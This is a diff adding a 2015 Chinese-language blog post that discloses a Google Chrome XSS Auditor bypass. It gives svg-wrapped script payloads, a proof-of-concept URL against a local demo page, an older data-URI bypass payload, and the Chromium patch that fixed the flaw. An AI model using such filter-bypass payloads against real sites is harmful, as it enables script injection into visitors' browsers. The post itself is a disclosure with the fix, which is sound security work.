@@ -1,0 +1,77 @@
+I"	<h1 id="google-chrome-anti-xss-filter-bypass">Google Chrome Anti-XSS Filter Bypass</h1>
+<p class="date">24 Jun 2015 - Tr3jer_CongRong</p>
+
+<h4 id="first">First</h4>
+
+<p>众所周知Chrome浏览器的Xss Filter是基于模糊匹配敏感关键字的方式进行拦截外部JavaScript脚本注入的，然而可以通过svg标签绕过Xss Filter.</p>
+
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/ysao8.png" /></p>
+
+<h4 id="details">Details</h4>
+
+<pre><code>Affected Products:
+Google Chrome 43.0.2357.124 m (letest stable version)
+
+Discovery Date:
+16-06-15
+
+Payload:
+&lt;svg&gt;&lt;script&gt;/&lt;1/&gt;alert()&lt;/script&gt;&lt;/svg&gt;
+&lt;svg&gt;&lt;script&gt;0&lt;1&gt;alert(document.domain)&lt;/script&gt;&lt;/svg&gt;
+</code></pre>
+
+<h4 id="poc">POC</h4>
+
+<p><code>OSX &amp; Chrome 43.0.2357.65</code></p>
+
+<pre><code>http://127.0.0.1/demo.php?xss=&lt;svg&gt;&lt;script&gt;/&lt;1/&gt;alert(document.domain)&lt;/script&gt;&lt;/svg&gt;
+</code></pre>
+
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/4rywe7.png" /></p>
+
+<blockquote>
+  <p>13年Gainover也分享过一个svg标签Bypass Chrome Xss Filter的Payload:<code>&lt;svg&gt;&lt;script xlink:href=data:,alert(1)&gt;&lt;/script&gt;&lt;/svg&gt;</code>现已失效.</p>
+</blockquote>
+
+<h4 id="patch">Patch</h4>
+
+<pre><code>Index: Source/core/html/parser/XSSAuditor.cppt a/Source/core/html/parser/XSSAuditor.cpp b/Source/core/html/parser/XSSAuditor.cpp
+index a1e1852201d23ac858c3b5065a2e26f52d128f4d..e73259145366c12c821a710fe83d3637529478ee 100644
+--- a/Source/core/html/parser/XSSAuditor.cpp
++++ b/Source/core/html/parser/XSSAuditor.cpp
+@@ -471,15 +471,18 @@ bool XSSAuditor::filterCharacterToken(const FilterTokenRequest&amp; request)
+if (m_state == PermittingAdjacentCharacterTokens)
+     return false;
+ 
+-    if ((m_state == SuppressingAdjacentCharacterTokens)
+-        || (m_scriptTagFoundInRequest &amp;&amp; isContainedInRequest(canonicalizedSnippetForJavaScript(request)))) {
++    if (m_state == FilteringTokens &amp;&amp; m_scriptTagFoundInRequest) {
++        String snippet = canonicalizedSnippetForJavaScript(request);
++        if (isContainedInRequest(snippet))
++            m_state = SuppressingAdjacentCharacterTokens;
++        else if (!snippet.isEmpty())
++            m_state = PermittingAdjacentCharacterTokens;
++    }
++    if (m_state == SuppressingAdjacentCharacterTokens) {
+     request.token.eraseCharacters();
+     request.token.appendToCharacter(' '); // Technically, character tokens can't be empty.
+-        m_state = SuppressingAdjacentCharacterTokens;
+     return true;
+ }
+-
+-    m_state = PermittingAdjacentCharacterTokens;
+ return false;
+ }
+</code></pre>
+
+<h4 id="other">Other</h4>
+
+<ul>
+  <li>
+    <p><a target="_blank" href="http://vulnerable.info/browsers/bypassing-chromes-anti-xss-filter/">Bypassing Chrome’s Anti-XSS Filter</a></p>
+  </li>
+  <li>
+    <p><a target="_blank" href="https://codereview.chromium.org/1187843005/">Issue 1187843005: XSSAuditor: Dont give a pass to subsequent script blocks if first one is empty. (Closed)</a></p>
+  </li>
+</ul>
+:ET
